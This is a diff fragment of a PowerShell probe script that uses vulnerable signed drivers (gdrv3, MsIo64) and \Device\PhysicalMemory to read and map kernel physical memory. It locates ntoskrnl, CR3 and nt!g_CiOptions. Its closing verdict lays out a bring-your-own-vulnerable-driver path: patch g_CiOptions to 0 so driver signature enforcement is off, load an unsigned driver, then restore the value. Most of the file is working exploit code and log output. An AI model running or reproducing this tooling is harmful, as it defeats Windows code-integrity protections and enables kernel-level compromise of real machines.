@@ -1,0 +1,123 @@
+﻿                    Log ("    W2 PASS - MsIo view maps pa=0x{0:x} (G-window covers it)" -f $pa)
+                } else { Log '    W2 marker NOT coherent' }
+                $um = [P36Prov]::MsIoUnmapTry($mio, 4, $pa, $o2h, $vb, $o4o, [ref]$e5)
+                Log ("    unmap: {0}" -f $um)
+            }
+        } elseif ($vb -ne 0) {
+            Log '    (non-RAM PA in G-window - view mapped, gdrv compare skipped)'
+        }
+        } catch {
+            Log ("  try3 pa=0x{0:x} EXCEPTION: {1}" -f $pa, $_.Exception.Message)
+        }
+        if ($verdict.W2_msio) { break }
+    }
+    [P36Prov]::CloseHandle2($mio) | Out-Null
+}
+
+# ---- W3: gdrv3 own map / copy -------------------------------------------
+Log ''
+Log '########## W3 gdrv3 0xC3502004 map / 0xC3502808 copy-user->phys ##########'
+if ($g -ne [IntPtr]::Zero) {
+    $va = [uint64]0; $e3 = [uint32]0
+    Log ("  0xC3502004 in{{pa,size}} pa=0x1000: {0}" -f ([P36Prov]::GdrvMapTry($g, [uint64]0x1000, [uint64]0x1000, [ref]$va, [ref]$e3)))
+    Log ("  0xC3502808 in{{b,a,n}} a=0x1000: {0}" -f ([P36Prov]::GdrvCopyTry($g, [uint64]0x1000, [uint64]0x2000, 8, [ref]$e3)))
+}
+# ---- X: discovery (read-only) -------------------------------------------
+Log ''
+Log '########## X discovery (read-only, gdrv3 read only) ##########'
+if ($g -ne [IntPtr]::Zero) {
+    # read limits FIRST - run 1 died in here without saying why
+    try {
+        $rep0 = ''
+        Log ("  ladder read 0x100000 okCount={0}" -f ([P36Prov]::SizeLadder($g, [uint64]0x100000, [ref]$rep0)))
+        foreach ($ln in ($rep0 -split "`r`n")) { if ($ln -ne '') { Log $ln } }
+    } catch { Log ("  ladder EXCEPTION: {0}" -f $_.Exception.Message) }
+    try {
+        $rep1 = ''
+        Log ("  sweep 0x100000..0x40000000 step 0x100000 okCount={0}" -f ([P36Prov]::SweepRead($g, [uint64]0x100000, [uint64]0x40000000, [uint64]0x100000, [ref]$rep1)))
+        foreach ($ln in ($rep1 -split "`r`n")) { if ($ln -ne '') { Log $ln } }
+    } catch { Log ("  sweep EXCEPTION: {0}" -f $_.Exception.Message) }
+
+    $hits = ''
+    try { $r1 = [P36Prov]::ScanNtoskrnl($g, $ramTop, [uint64]0x40000000, [ref]$hits) }
+    catch { $r1 = ''; Log ("  X1 EXCEPTION: {0}" -f $_.Exception.Message) }
+    foreach ($ln in ($hits -split "`r`n")) { if ($ln -ne '') { Log $ln } }
+    if ($r1 -eq '') { Log '  X1 no validated ntoskrnl below 1 GB'; } else {
+        $m = [regex]::Match($hits, 'pa=0x([0-9a-f]+) sizeOfImage=0x([0-9a-f]+).*export\[yes\]')
+        if ($m.Success) {
+            $ntPhys = [uint64]::Parse($m.Groups[1].Value, 'HexNumber')
+            $ntSize = [uint32]::Parse($m.Groups[2].Value, 'HexNumber')
+            Log ("  X1 ntoskrnl phys=0x{0:x} sizeOfImage=0x{1:x}  PASS" -f $ntPhys, $ntSize)
+            $verdict.X_ntos = $true
+        }
+    }
+
+    # X2 CR3 by PML4 self-reference (index 0x1ED, double-checked)
+    foreach ($lim in [uint64]0x40000000, [uint64]0x100000000) {
+        $notes = ''
+        try { $r2 = [P36Prov]::FindPml4($g, $ramTop, $lim, [ref]$cr3, [ref]$notes) }
+        catch { Log ("  X2 EXCEPTION (lim=0x{0:x}): {1}" -f $lim, $_.Exception.Message) }
+        foreach ($ln in ($notes -split "`r`n")) { if ($ln -ne '') { Log $ln } }
+        if ($cr3 -ne 0) { break }
+    }
+    if ($cr3 -eq 0) { Log '  X2 no self-mapped PML4 found  FAIL' } else {
+        $self = [uint64]0
+        $wok = $false
+        try { $wok = [P36Prov]::Walk($g, $cr3, [uint64]0xFFFFF6FB7DBED000, [ref]$self) }
+        catch { Log ("  X2 walk EXCEPTION: {0}" -f $_.Exception.Message) }
+        Log ("  X2 cr3=0x{0:x}  self-test walk(PXE_BASE)=0x{1:x} present={2}" -f $cr3, $self, $wok)
+        $verdict.X_cr3 = ($wok -and $self -eq $cr3)
+        Log ("  X2 CR3 {'VALID' if self-consistent} = {0}" -f $verdict.X_cr3)
+    }
+
+    # X3 ntoskrnl virtual base
+    if ($verdict.X_cr3 -and $ntPhys -ne 0) {
+        try { $r3 = [P36Prov]::FindKernelVa($g, $cr3, $ntPhys, $ntSize, [ref]$ntVa) }
+        catch { $r3 = ''; Log ("  X3 EXCEPTION: {0}" -f $_.Exception.Message) }
+        if ($r3 -eq '') { Log '  X3 ntoskrnl VA not found  FAIL' }
+        else { Log ("  X3 ntoskrnl VA base=0x{0:x}  PASS" -f $ntVa) }
+    }
+
+    # X4 nt!g_CiOptions (informational - no write in this probe)
+    if ($ntVa -ne 0) {
+        $rep = ''
+        try { $n = [P36Prov]::FindCiOptions($g, $cr3, $ntVa, $ntPhys, $ntSize, [ref]$rep) }
+        catch { $n = '0'; Log ("  X4 EXCEPTION: {0}" -f $_.Exception.Message) }
+        foreach ($ln in ($rep -split "`r`n")) { if ($ln -ne '') { Log $ln } }
+        Log ("  X4 pattern hits = {0}" -f $n)
+        $ms = [regex]::Match($rep, 'targetVa=0x([0-9a-f]+) targetPa=0x([0-9a-f]+) current=0x([0-9a-f]+)\s+<==')
+        if ($ms.Success) {
+            $ciTargetVa = [uint64]::Parse($ms.Groups[1].Value, 'HexNumber')
+            $ciValue = [uint32]::Parse($ms.Groups[3].Value, 'HexNumber')
+            $verdict.X_ci = $true
+            Log ("  X4 g_CiOptions targetVa=0x{0:x} current=0x{1:x2}  REGISTERED for the p37 patch" -f $ciTargetVa, $ciValue)
+        } else { Log '  X4 no self-consistent hit (still usable: report lists every candidate)' }
+    }
+}
+
+# ---- VERDICT ------------------------------------------------------------
+Log ''
+if ($script:ioSw) { try { $script:ioSw.Flush(); $script:ioSw.Close() } catch { } }
+Log ("  io: issued={0} skipped_not_ram={1} lastPa=0x{2:x}" -f [P36Prov]::Issued, [P36Prov]::SkippedOutOfRam, [P36Prov]::LastIssuedPa)
+Log '########## VERDICT ##########'
+Log ("  W1 \\Device\\PhysicalMemory phys R/W : {0}" -f $(if ($verdict.W1_physmem) { 'PASS' } else { 'no' }))
+Log ("  W2 MsIo64 map (fallback)           : {0}" -f $(if ($verdict.W2_msio) { 'PASS' } else { 'no' }))
+Log ("  W3 gdrv3 map/copy                  : see above")
+Log ("  X  ntoskrnl={0} cr3={1} cioptions={2}" -f $verdict.X_ntos, $verdict.X_cr3, $verdict.X_ci)
+if ($verdict.W1_physmem -or $verdict.W2_msio) {
+    Log '  *** WRITE PRIMITIVE AVAILABLE ***'
+    Log '      => BYOVD path = stage nothing, keep testsigning OFF on a normal boot,'
+    Log '         patch nt!g_CiOptions to 0, `sc start apexdrv` (loader does relocs,'
+    Log '         imports and DriverEntry), restore g_CiOptions, then G1 gate run.'
+    if ($verdict.X_cr3 -and $verdict.X_ci) { Log '      cr3 + g_CiOptions are resolved => p37 can patch immediately.' }
+    else { Log '      cr3/g_CiOptions need one more pass before p37.' }
+} else {
+    Log '  *** NO WRITE PRIMITIVE ***'
+    Log '      => driver-loaded-on-a-normal-boot is unreachable until one of W1/W2 lands.'
+    Log '      Next variable: MsIo64 struct shape from temp\drv\msio_1500.txt, or a'
+    Log '      second provider (the box has gdrv3 + MsIo only).'
+}
+if ($g -ne [IntPtr]::Zero) { [P36Prov]::CloseHandle2($g) | Out-Null }
+Log ("-- p36 END {0} --" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss'))
+$script:L | Out-Null
+
